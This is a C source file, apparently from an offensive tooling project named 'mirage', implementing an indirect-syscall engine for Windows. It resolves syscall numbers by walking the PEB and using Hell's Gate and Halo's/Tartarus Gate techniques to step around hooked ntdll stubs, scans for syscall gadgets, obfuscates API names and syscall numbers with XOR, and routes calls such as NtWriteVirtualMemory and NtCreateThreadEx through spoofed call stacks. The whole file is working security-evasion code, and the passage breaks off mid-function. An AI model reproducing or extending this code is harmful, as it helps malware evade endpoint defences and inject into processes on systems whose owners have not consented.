/*
 * engine.c — Syscall engine with WinAPI fallback
 *
 * Tries PEB walk for indirect syscalls. If it fails, falls back
 * to standard kernel32.dll / ntdll.dll imports.
 *
 * Resolution is table-driven (g_syscalls) and fail-closed: every entry
 * must resolve to a non-zero SSN via direct stub read (Hell's Gate) or
 * the Halo neighbor walk (Tartarus Gate); otherwise mirage_syscall_resolve()
 * returns 0 and the whole engine stays in WinAPI fallback mode. obf()
 * never XORs a zero slot — the historical bug that made stubs issue
 * syscall #0.
 */
#include "engine.h"
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include "config.h"
#ifndef ZIALFI_TEST_MODE
#include "mirage_asm.h"
#include "stack_spoof.h"
#else
/* Host-test seam: skip asm/spoof declarations — inert definitions are
 * provided below so the gcc host build links without NASM objects. */
#include <stdint.h>
extern uint32_t ssn_NtAllocateVirtualMemory, ssn_NtProtectVirtualMemory,
       ssn_NtFreeVirtualMemory, ssn_NtWriteVirtualMemory, ssn_NtClose,
       ssn_NtOpenFile, ssn_NtReadVirtualMemory, ssn_NtCreateSection,
       ssn_NtMapViewOfSection, ssn_NtQueryInformationProcess,
       ssn_NtCreateFile, ssn_NtWriteFile, ssn_NtQuerySystemInformation,
       ssn_NtDelayExecution, ssn_NtCreateEvent, ssn_NtWaitForSingleObject,
       ssn_NtOpenKey, ssn_NtQueryValueKey, ssn_NtSetInformationProcess,
       ssn_NtSetInformationFile, ssn_NtGetContextThread,
       ssn_NtSetContextThread, ssn_NtOpenSection, ssn_NtUnmapViewOfSection,
       ssn_NtCreateThreadEx, ssn_NtOpenProcess, ssn_NtResumeThread,
       ssn_NtSuspendThread, ssn_NtDeleteFile, ssn_NtFlushInstructionCache;
extern uintptr_t gadget_pool[64];
void *getPeb(void);
#endif
#include "enc_strings.h"
#include <stddef.h>
#include <windows.h>

/* ── State ────────────────────────────────────────────────────── */
static int g_use_fallback = 1;

/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
uint32_t ssn_xor_key = 0xA3B5C7D9;

/* ═══════ Per-entry indirect gadgets (0F 05 within stub+0x22) ═══ */
static uintptr_t g_gadgets[30];

uintptr_t mirage_syscall_gadget(uint32_t index) {
    if (index >= 30) return 0;
    return g_gadgets[index];
}

/* ── PEB-based resolution ─────────────────────────────────────── */

static inline uint32_t r32le(const uint8_t* p) {
    return (uint32_t)p[0]|((uint32_t)p[1]<<8)|
           ((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24);
}

static int hooked(const uint8_t* s) {
    if (s[0]==0xE9) return 1;
    if (s[0]==0xFF && s[1]==0x25) return 1;
    if (s[0]==0xCC) return 1;
    return 0;
}

/*
 * Strict stub match (zcircuit isCleanStub / sysplant isClean):
 *   4C 8B D1        mov r10, rcx
 *   B8 xx xx 00 00  mov eax, <SSN>  (imm32 zero-extended, < 0x1000)
 * The imm32 upper bound rejects poison/medium stubs (e.g. wow64 trampolines
 * carrying large immediates) that the old loose window check accepted.
 */
static int is_clean_stub(const uint8_t* p) {
    if (p[0]!=0x4C || p[1]!=0x8B || p[2]!=0xD1 || p[3]!=0xB8)
        return 0;
    if (p[6]!=0x00 || p[7]!=0x00)
        return 0;
    uint32_t imm = r32le(p+4);
    return imm != 0 && imm < 0x1000;
}

static uint32_t extract_ssn(const uint8_t* p) {
    return r32le(p+4);
}

typedef struct { uintptr_t s; uintptr_t e; } TB;

static int tbounds(void* base, TB* o) {
    uint8_t* bp=(uint8_t*)base;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)bp;
    if (dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;
    uint32_t off=(uint32_t)dos->e_lfanew;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(bp+off);
    if (nt->Signature!=IMAGE_NT_SIGNATURE) return 0;
    uint32_t so=off+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)
               +nt->FileHeader.SizeOfOptionalHeader;
    PIMAGE_SECTION_HEADER sc=(PIMAGE_SECTION_HEADER)(bp+so);
    for (uint16_t i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if (sc[i].Name[0]=='.' && sc[i].Name[1]=='t' &&
            sc[i].Name[2]=='e' && sc[i].Name[3]=='x' &&
            sc[i].Name[4]=='t') {
            o->s=(uintptr_t)bp+sc[i].VirtualAddress;
            o->e=o->s+sc[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ── Halo's Gate / Tartarus Gate fallback ─────────────────────── */

#define HALO_MAX_DISTANCE 200   /* bounded neighbor walk (ponytail: was unbounded in refs) */

static uint32_t resolve_ssn_halo(void* ntdll_base, uint32_t target_hash) {
    void* func = mirage_get_function_by_hash(ntdll_base, target_hash);
    if (!func) return 0;

    uint8_t* bytes = (uint8_t*)func;
    if (is_clean_stub(bytes))
        return extract_ssn(bytes);

    TB b;
    if (!tbounds(ntdll_base, &b)) return 0;

    uintptr_t sa = (uintptr_t)func;
    for (uintptr_t d = 1; d <= HALO_MAX_DISTANCE; d++) {
        /* forward neighbor: ssn = neighbor - d */
        uintptr_t fw = sa + d*0x20;
        if (fw+8 < b.e) {
            const uint8_t* fs = (const uint8_t*)fw;
            if (is_clean_stub(fs))
                return extract_ssn(fs) - (uint32_t)d;
        }
        /* backward neighbor: ssn = neighbor + d
         * guard unsigned underflow: fw - sa must be inside the section */
        if ((sa - b.s) >= d*0x20) {
            uintptr_t bw = sa - d*0x20;
            if (bw+8 < b.e) {
                const uint8_t* bs = (const uint8_t*)bw;
                if (is_clean_stub(bs))
                    return extract_ssn(bs) + (uint32_t)d;
            }
        }
    }
    return 0;
}

/* ── Resolution table ─────────────────────────────────────────── */

typedef struct {
    const uint8_t *name_enc;   /* enc_* array from enc_strings.h */
    size_t         name_len;
    uint32_t      *ssn_slot;   /* ssn_NtX global shared with asm stubs */
} syscall_entry_t;

/* 30 ntdll syscalls, EXCLUDING NtUserGetSystemMetrics (win32u.dll —
 * unresolvable from ntdll; wrapper falls back to user32 unconditionally).
 * Index order is public: mirage_syscall_gadget(index). */
static const syscall_entry_t g_syscalls[] = {
    { enc_NtAllocateVirtualMemory,     ENC_NTALLOCATEVIRTUALMEMORY_LEN,     &ssn_NtAllocateVirtualMemory },
    { enc_NtProtectVirtualMemory,      ENC_NTPROTECTVIRTUALMEMORY_LEN,      &ssn_NtProtectVirtualMemory },
    { enc_NtFreeVirtualMemory,         ENC_NTFREEVIRTUALMEMORY_LEN,         &ssn_NtFreeVirtualMemory },
    { enc_NtWriteVirtualMemory,        ENC_NTWRITEVIRTUALMEMORY_LEN,        &ssn_NtWriteVirtualMemory },
    { enc_NtClose,                     ENC_NTCLOSE_LEN,                     &ssn_NtClose },
    { enc_NtOpenFile,                  ENC_NTOPENFILE_LEN,                  &ssn_NtOpenFile },
    { enc_NtReadVirtualMemory,         ENC_NTREADVIRTUALMEMORY_LEN,         &ssn_NtReadVirtualMemory },
    { enc_NtCreateSection,             ENC_NTCREATESECTION_LEN,             &ssn_NtCreateSection },
    { enc_NtMapViewOfSection,          ENC_NTMAPVIEWOFSECTION_LEN,          &ssn_NtMapViewOfSection },
    { enc_NtQueryInformationProcess,   ENC_NTQUERYINFORMATIONPROCESS_LEN,   &ssn_NtQueryInformationProcess },
    { enc_NtCreateFile,                ENC_NTCREATEFILE_LEN,                &ssn_NtCreateFile },
    { enc_NtWriteFile,                 ENC_NTWRITEFILE_LEN,                 &ssn_NtWriteFile },
    { enc_NtQuerySystemInformation,    ENC_NTQUERYSYSTEMINFORMATION_LEN,    &ssn_NtQuerySystemInformation },
    { enc_NtDelayExecution,            ENC_NTDELAYEXECUTION_LEN,            &ssn_NtDelayExecution },
    { enc_NtCreateEvent,               ENC_NTCREATEEVENT_LEN,               &ssn_NtCreateEvent },
    { enc_NtWaitForSingleObject,       ENC_NTWAITFORSINGLEOBJECT_LEN,       &ssn_NtWaitForSingleObject },
    { enc_NtOpenKey,                   ENC_NTOPENKEY_LEN,                   &ssn_NtOpenKey },
    { enc_NtQueryValueKey,             ENC_NTQUERYVALUEKEY_LEN,             &ssn_NtQueryValueKey },
    { enc_NtSetInformationProcess,     ENC_NTSETINFORMATIONPROCESS_LEN,     &ssn_NtSetInformationProcess },
    { enc_NtSetInformationFile,        ENC_NTSETINFORMATIONFILE_LEN,        &ssn_NtSetInformationFile },
    { enc_NtGetContextThread,          ENC_NTGETCONTEXTTHREAD_LEN,          &ssn_NtGetContextThread },
    { enc_NtSetContextThread,          ENC_NTSETCONTEXTTHREAD_LEN,          &ssn_NtSetContextThread },
    { enc_NtOpenSection,               ENC_NTOPENSECTION_LEN,               &ssn_NtOpenSection },
    { enc_NtUnmapViewOfSection,        ENC_NTUNMAPVIEWOFSECTION_LEN,        &ssn_NtUnmapViewOfSection },
    { enc_NtCreateThreadEx,            ENC_NTCREATETHREADEX_LEN,            &ssn_NtCreateThreadEx },
    { enc_NtOpenProcess,               ENC_NTOPENPROCESS_LEN,               &ssn_NtOpenProcess },
    { enc_NtResumeThread,              ENC_NTRESUMETHREAD_LEN,              &ssn_NtResumeThread },
    { enc_NtSuspendThread,             ENC_NTSUSPENDTHREAD_LEN,             &ssn_NtSuspendThread },
    { enc_NtDeleteFile,                ENC_NTDELETEFILE_LEN,                &ssn_NtDeleteFile },
    { enc_NtFlushInstructionCache,     ENC_NTFLUSHINSTRUCTIONCACHE_LEN,     &ssn_NtFlushInstructionCache },
};

#define SYSCALL_COUNT (sizeof(g_syscalls) / sizeof(g_syscalls[0]))

static void obf(void) {
    /* XOR-deobfuscate resolved SSNs in place for the asm stubs.
     * Zero entries stay zero — XORing 0 would fabricate ssn_xor_key as
     * the syscall number (the historical "issue syscall #0" bug). */
    for (size_t i = 0; i < SYSCALL_COUNT; i++) {
        uint32_t* p = g_syscalls[i].ssn_slot;
        if (*p != 0)
            *p ^= ssn_xor_key;
    }
}

/* Scan forward <= 0x22 bytes from a clean stub for a 0F 05 (syscall)
 * sequence — Hell's Hall gadget for later indirect execution. */
static uintptr_t scan_gadget(const uint8_t* stub, const TB* b) {
    uintptr_t a = (uintptr_t)stub;
    for (size_t k = 0; k <= 0x22; k++) {
        uintptr_t g = a + k;
        if (g + 1 >= b->e) break;
        const uint8_t* p = (const uint8_t*)g;
        if (p[0] == 0x0F && p[1] == 0x05)
            return g;
    }
    return 0;
}

/* ── .mi_cfg section reader ------------------------------------ */
typedef struct {
    uint32_t seed;
    uint8_t  string_key[16];
    uint32_t ssn_xor_key;
} mi_cfg_t;

static mi_cfg_t g_mi_cfg;
static int g_mi_cfg_loaded_flag = 0;

int mi_cfg_load(void) {
    if (g_mi_cfg_loaded_flag) return g_mi_cfg.seed != 0;
    g_mi_cfg_loaded_flag = 1;

    void *base = (void *)__readgsqword(0x60);
    if (!base) return 0;
    base = *(void **)((char *)base + 0x10);
    if (!base) return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((char *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD sec_off = dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)
                  + nt->FileHeader.SizeOfOptionalHeader;
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((char *)base + sec_off);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".mi_cfg", 7) == 0) {
            uint8_t *data = (uint8_t *)base + sec[i].VirtualAddress;
            memcpy(&g_mi_cfg.seed, data, 4);
            memcpy(&g_mi_cfg.string_key, data + 4, 16);
            memcpy(&g_mi_cfg.ssn_xor_key, data + 20, 4);
            return 1;
        }
    }
    return 0;
}

int mirage_syscall_resolve(void) {
    /* Generate dynamic SSN XOR key per-run */
    /* ponytail: GetTickCount is an import (breaks -nostdlib link); rdtsc is
     * link-free entropy, adequate for a per-run XOR key. */
    ssn_xor_key = mi_cfg_load() ? g_mi_cfg.ssn_xor_key
                                : (MIRAGE_SEED ^ (uint32_t)__rdtsc());

    char dll_buf[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_buf);
    uint32_t h = mirage_encrypted_hash_module(dll_buf);
    void* ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) { g_use_fallback = 1; return 0; }
    mirage_init_native_resolver(ntdll);

    TB b;
    int have_bounds = tbounds(ntdll, &b);
    int all_resolved = 1;
    uint32_t unresolved = 0;

    char fn_buf[32];
    for (size_t i = 0; i < SYSCALL_COUNT; i++) {
        const syscall_entry_t* e = &g_syscalls[i];
        *e->ssn_slot = 0;

        enc_decrypt(e->name_enc, e->name_len, fn_buf);
        uint32_t hash = mirage_encrypted_hash_func(fn_buf);
        uint32_t ssn = resolve_ssn_halo(ntdll, hash);
        if (ssn != 0 && ssn < 0x1000)
            *e->ssn_slot = ssn;
        else {
            all_resolved = 0;
            unresolved++;
            continue;
        }

        /* gadget scan: forward <= 0x22 from the stub itself; hooked or
         * poisoned stubs borrow the nearest clean neighbor's gadget —
         * every 0F 05 in the syscall region is interchangeable. */
        if (have_bounds) {
            void* fp = mirage_get_function_by_hash(ntdll, hash);
            if (fp) {
                const uint8_t* stub = (const uint8_t*)fp;
                if (is_clean_stub(stub)) {
                    g_gadgets[i] = scan_gadget(stub, &b);
                } else {
                    uintptr_t sa = (uintptr_t)stub;
                    for (uintptr_t d = 1; d <= HALO_MAX_DISTANCE; d++) {
                        uintptr_t fw = sa + d*0x20;
                        if (fw+8 >= b.e) break;
                        if (is_clean_stub((const uint8_t*)fw)) {
                            g_gadgets[i] = scan_gadget((const uint8_t*)fw, &b);
                            break;
                        }
                        if (sa >= b.s + d*0x20) {
                            uintptr_t bw = sa - d*0x20;
                            if (is_clean_stub((const uint8_t*)bw)) {
                                g_gadgets[i] = scan_gadget((const uint8_t*)bw, &b);
                                break;
                            }
                        }
                    }
                }
            }
        }
    }

    /* Fail-closed: any unresolved entry → whole engine stays in
     * WinAPI fallback. Never dispatch a stub with a zero SSN. */
    if (!all_resolved) {
        obf();  /* zero-guarded: only non-zero slots get XORed */
        g_use_fallback = 1;
        (void)unresolved;
        return 0;
    }

    obf();
    g_use_fallback = 0;
    return 1;
}

int mirage_init_gadget_pool(void) {
    void* ntdll = NULL;
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll);
    uint32_t h = mirage_encrypted_hash_module(dll);
    ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) return 0;
    TB b;
    if (!tbounds(ntdll, &b)) return 0;
    const uint8_t* d=(const uint8_t*)b.s;
    uintptr_t len = b.e - b.s;
    uint32_t c = 0;
    for (uintptr_t i=0; i+2<len && c<64; i++)
        if (d[i]==0x0F && d[i+1]==0x05 && d[i+2]==0xC3)
            gadget_pool[c++] = b.s + i;
    if (c==0) return 0;
    for (uint32_t i=c; i<64; i++)
        gadget_pool[i] = gadget_pool[i % c];
    return 1;
}

/* ═══════ XOR-obfuscated export names ══════════════════════════ */

static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0xdf, 0xfa, 0x9b, 0x5d, 0x2a, 0x43, 0xe7, 0x5e, 0x59, 0x1b, 0x37, 0x41, 0x53, 0xce, 0x0f, 0xf0, 0xfd, 0xc3, 0xbf, 0x5c, 0x29, 0x5e, 0xfd };
static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0xdf, 0xfa, 0x8a, 0x43, 0x29, 0x58, 0xe1, 0x5c, 0x59, 0x28, 0x08, 0x5a, 0x55, 0xcf, 0x1b, 0xfd, 0xdc, 0xeb, 0xb7, 0x5e, 0x34, 0x55 };
static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0xdf, 0xfa, 0x9c, 0x43, 0x23, 0x49, 0xd2, 0x56, 0x5f, 0x0a, 0x14, 0x49, 0x4d, 0xf7, 0x1f, 0xfc, 0xfe, 0xfc, 0xa3 };
static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0xdf, 0xfa, 0x8d, 0x43, 0x2f, 0x58, 0xe1, 0x69, 0x44, 0x0c, 0x15, 0x5d, 0x40, 0xd6, 0x37, 0xf4, 0xfc, 0xe1, 0xa8, 0x48 };
static const unsigned char _NtReadVirtualMemory_obf[19] = { 0xdf, 0xfa, 0x88, 0x54, 0x27, 0x48, 0xd2, 0x56, 0x5f, 0x0a, 0x14, 0x49, 0x4d, 0xf7, 0x1f, 0xfc, 0xfe, 0xfc, 0xa3 };
static const unsigned char _NtClose_obf[7] = { 0xdf, 0xfa, 0x99, 0x5d, 0x29, 0x5f, 0xe1 };
static const unsigned char _NtQuerySystemInformation_obf[24] = { 0xdf, 0xfa, 0x8b, 0x44, 0x23, 0x5e, 0xfd, 0x6c, 0x54, 0x0d, 0x15, 0x4d, 0x4c, 0xf3, 0x14, 0xf7, 0xfe, 0xfc, 0xb7, 0x50, 0x32, 0x45, 0xeb, 0x51 };
static const unsigned char _NtQueryInformationProcess_obf[25] = { 0xdf, 0xfa, 0x8b, 0x44, 0x23, 0x5e, 0xfd, 0x76, 0x43, 0x18, 0x0e, 0x5a, 0x4c, 0xdb, 0x0e, 0xf8, 0xfe, 0xe0, 0x8a, 0x43, 0x29, 0x4f, 0xe1, 0x4c, 0x5e };
static const unsigned char _NtDelayExecution_obf[16] = { 0xdf, 0xfa, 0x9e, 0x54, 0x2a, 0x4d, 0xfd, 0x7a, 0x55, 0x1b, 0x02, 0x5d, 0x55, 0xd3, 0x15, 0xff };
static const unsigned char _NtOpenFile_obf[10] = { 0xdf, 0xfa, 0x95, 0x41, 0x23, 0x42, 0xc2, 0x56, 0x41, 0x1b };
static const unsigned char _NtWriteFile_obf[11] = { 0xdf, 0xfa, 0x8d, 0x43, 0x2f, 0x58, 0xe1, 0x79, 0x44, 0x12, 0x04 };
static const unsigned char _NtSetInformationProcess_obf[23] = { 0xdf, 0xfa, 0x89, 0x54, 0x32, 0x65, 0xea, 0x59, 0x42, 0x0c, 0x0c, 0x49, 0x55, 0xd3, 0x15, 0xff, 0xc1, 0xfc, 0xb5, 0x52, 0x23, 0x5f, 0xf7 };
static const unsigned char _NtOpenKey_obf[9] = { 0xdf, 0xfa, 0x95, 0x41, 0x23, 0x42, 0xcf, 0x5a, 0x54 };
static const unsigned char _NtQueryValueKey_obf[15] = { 0xdf, 0xfa, 0x8b, 0x44, 0x23, 0x5e, 0xfd, 0x69, 0x4c, 0x12, 0x14, 0x4d, 0x6a, 0xdf, 0x03 };
static const unsigned char _NtOpenProcess_obf[13] = { 0xdf, 0xfa, 0x95, 0x41, 0x23, 0x42, 0xd4, 0x4d, 0x42, 0x1d, 0x04, 0x5b, 0x52 };
static const unsigned char _NtCreateThreadEx_obf[16] = { 0xdf, 0xfa, 0x99, 0x43, 0x23, 0x4d, 0xf0, 0x5a, 0x79, 0x16, 0x13, 0x4d, 0x40, 0xde, 0x3f, 0xe9 };
static const unsigned char _NtFlushInstructionCache_obf[23] = { 0xdf, 0xfa, 0x9c, 0x5d, 0x33, 0x5f, 0xec, 0x76, 0x43, 0x0d, 0x15, 0x5a, 0x54, 0xd9, 0x0e, 0xf8, 0xfe, 0xe0, 0x99, 0x50, 0x25, 0x44, 0xe1 };
static const unsigned char _NtCreateEvent_obf[13] = { 0xdf, 0xfa, 0x99, 0x43, 0x23, 0x4d, 0xf0, 0x5a, 0x68, 0x08, 0x04, 0x46, 0x55 };
static const unsigned char _NtDeleteFile_obf[12] = { 0xdf, 0xfa, 0x9e, 0x54, 0x2a, 0x49, 0xf0, 0x5a, 0x6b, 0x17, 0x0d, 0x4d };
static const unsigned char _NtSetInformationFile_obf[20] = { 0xdf, 0xfa, 0x89, 0x54, 0x32, 0x65, 0xea, 0x59, 0x42, 0x0c, 0x0c, 0x49, 0x55, 0xd3, 0x15, 0xff, 0xd7, 0xe7, 0xb6, 0x54 };
static const unsigned char _NtCreateFile_obf[12] = { 0xdf, 0xfa, 0x99, 0x43, 0x23, 0x4d, 0xf0, 0x5a, 0x6b, 0x17, 0x0d, 0x4d };
static void deobf_str(const unsigned char *obf, size_t len, char *out) {
    for (size_t i = 0; i < len; i++)
        out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
    out[len] = '\0';
}

#ifdef ZIALFI_TEST_MODE
/* Host-test seam: the ssn_* globals live in the NASM .data section on the
 * real build; define them here for the gcc host build. */
uint32_t ssn_NtAllocateVirtualMemory, ssn_NtProtectVirtualMemory,
         ssn_NtFreeVirtualMemory, ssn_NtWriteVirtualMemory, ssn_NtClose,
         ssn_NtOpenFile, ssn_NtReadVirtualMemory, ssn_NtCreateSection,
         ssn_NtMapViewOfSection, ssn_NtQueryInformationProcess,
         ssn_NtCreateFile, ssn_NtWriteFile, ssn_NtQuerySystemInformation,
         ssn_NtDelayExecution, ssn_NtCreateEvent, ssn_NtWaitForSingleObject,
         ssn_NtOpenKey, ssn_NtQueryValueKey, ssn_NtSetInformationProcess,
         ssn_NtSetInformationFile, ssn_NtGetContextThread,
         ssn_NtSetContextThread, ssn_NtOpenSection, ssn_NtUnmapViewOfSection,
         ssn_NtSuspendThread, ssn_NtDeleteFile, ssn_NtFlushInstructionCache,
         ssn_NtCreateThreadEx, ssn_NtOpenProcess, ssn_NtResumeThread;
uintptr_t gadget_pool[64];
void *getPeb(void) { return 0; }
#endif
#ifndef ZIALFI_TEST_MODE

#define RESOLVE_EXPORT_OBF(arr) resolve_export_obf(arr, sizeof(arr))

typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, SIZE_T*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtFreeVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);
typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtDelayExecution)(BOOLEAN, LARGE_INTEGER*);
typedef NTSTATUS (WINAPI *pNtOpenFile)(HANDLE*, ULONG, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtOpenKey)(HANDLE*, ULONG, PVOID);
typedef NTSTATUS (WINAPI *pNtQueryValueKey)(HANDLE, PVOID, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtOpenProcess)(HANDLE*, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtCreateThreadEx)(HANDLE*, ULONG, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (WINAPI *pNtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (WINAPI *pNtCreateEvent)(HANDLE*, ULONG, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtDeleteFile)(PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationFile)(HANDLE, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtCreateFile)(HANDLE*, ULONG, PVOID, PVOID, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

static void* ntdll_via_peb(void) {
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll); return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
}

static void* resolve_export_obf(const unsigned char *obf, size_t len) {
    void *ntdll = ntdll_via_peb();
    if (!ntdll) return NULL;
    char name[128];
    deobf_str(obf, (len < sizeof(name)) ? len : (sizeof(name) - 1), name);
    return mirage_get_function_by_hash(ntdll, mirage_encrypted_hash_func(name));
}
NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtAllocateVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtAllocateVirtualMemory_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,f);
    }
    static pNtAllocateVirtualMemory fn = NULL;
    if (!fn) fn = (pNtAllocateVirtualMemory)resolve_export_obf(_NtAllocateVirtualMemory_obf, sizeof(_NtAllocateVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtProtectVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtProtectVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtProtectVirtualMemory fn = NULL;
    if (!fn) fn = (pNtProtectVirtualMemory)resolve_export_obf(_NtProtectVirtualMemory_obf, sizeof(_NtProtectVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFreeVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtFreeVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d);
    }
    static pNtFreeVirtualMemory fn = NULL;
    if (!fn) fn = (pNtFreeVirtualMemory)resolve_export_obf(_NtFreeVirtualMemory_obf, sizeof(_NtFreeVirtualMemory_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtWriteVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtWriteVirtualMemory fn = NULL;
    if (!fn) fn = (pNtWriteVirtualMemory)resolve_export_obf(_NtWriteVirtualMemory_obf, sizeof(_NtWriteVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtReadVirtualMemory_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtReadVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtReadVirtualMemory fn = NULL;
    if (!fn) fn = (pNtReadVirtualMemory)resolve_export_obf(_NtReadVirtualMemory_obf, sizeof(_NtReadVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtClose(HANDLE a) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtClose_stub,
                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtClose_stub((uint64_t)a);
    }
    static pNtClose fn = NULL;
    if (!fn) fn = (pNtClose)resolve_export_obf(_NtClose_obf, sizeof(_NtClose_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQuerySystemInformation_stub,
                a, (uint64_t)b, c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQuerySystemInformation_stub(a,(uint64_t)b,c,(uint64_t)d);
    }
    static pNtQuerySystemInformation fn = NULL;
    if (!fn) fn = (pNtQuerySystemInformation)resolve_export_obf(_NtQuerySystemInformation_obf, sizeof(_NtQuerySystemInformation_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryInformationProcess_stub,
